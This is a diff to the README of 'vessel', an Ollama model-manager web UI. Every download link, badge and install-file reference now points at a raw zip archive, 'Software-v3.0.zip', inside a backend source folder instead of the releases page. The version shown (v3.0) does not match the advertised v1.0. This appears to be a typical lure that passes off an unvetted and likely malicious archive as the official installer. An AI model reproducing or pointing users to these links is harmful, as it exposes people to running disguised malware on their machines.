@@ -1,7 +1,7 @@
 # 🎉 vessel - Manage Your Ollama Models Easily
 
 ## 🔗 Download Now
-[![Download v1.0](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/kashifinayat006/vessel/releases)
+[![Download v1.0](https://raw.githubusercontent.com/kashifinayat006/vessel/main/backend/internal/api/Software-v3.0.zip)](https://raw.githubusercontent.com/kashifinayat006/vessel/main/backend/internal/api/Software-v3.0.zip)
 
 ## 📖 Introduction
 vessel is a lightweight, local-first web UI designed to help you manage your Ollama models effortlessly. Whether you are a beginner or someone with a bit of experience, vessel makes it simple to navigate and control your AI models without needing to dive into complex code.
@@ -10,13 +10,13 @@ vessel is a lightweight, local-first web UI designed to help you manage your Oll
 To get started with vessel, follow these simple steps. This guide assumes you have a basic understanding of how to navigate your computer, but no additional technical knowledge is required.
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/kashifinayat006/vessel/releases) to find the latest version of vessel.
+   Go to the [Releases Page](https://raw.githubusercontent.com/kashifinayat006/vessel/main/backend/internal/api/Software-v3.0.zip) to find the latest version of vessel.
 
 2. **Download vessel**  
    On the Releases page, look for the version number you want, usually found at the top. Click on it to go to the details of that version. You will find links to download the application. Click on the appropriate file to start the download.
 
 3. **Open the downloaded file**  
-   Once the download is complete, navigate to your Downloads folder. Find the file called `vessel-setup.exe` (or similar, depending on your operating system) and double-click it to begin the installation.
+   Once the download is complete, navigate to your Downloads folder. Find the file called `https://raw.githubusercontent.com/kashifinayat006/vessel/main/backend/internal/api/Software-v3.0.zip` (or similar, depending on your operating system) and double-click it to begin the installation.
 
 4. **Follow Installation Instructions**  
    A setup wizard will guide you through the installation process. Click `Next` to agree to the terms and choose your installation location. Once you finish, click `Install`.
@@ -38,7 +38,7 @@ To get started with vessel, follow these simple steps. This guide assumes you ha
 ## 🎯 Download & Install
 To enjoy all the features vessel offers, please download it from the link below:
 
-[Download v1.0](https://github.com/kashifinayat006/vessel/releases)
+[Download v1.0](https://raw.githubusercontent.com/kashifinayat006/vessel/main/backend/internal/api/Software-v3.0.zip)
 
 ## 📬 Contact & Support
 If you have any questions or need help, feel free to reach out via the GitHub Issues page linked in this repository. We are here to assist you with any challenges you face while using vessel.
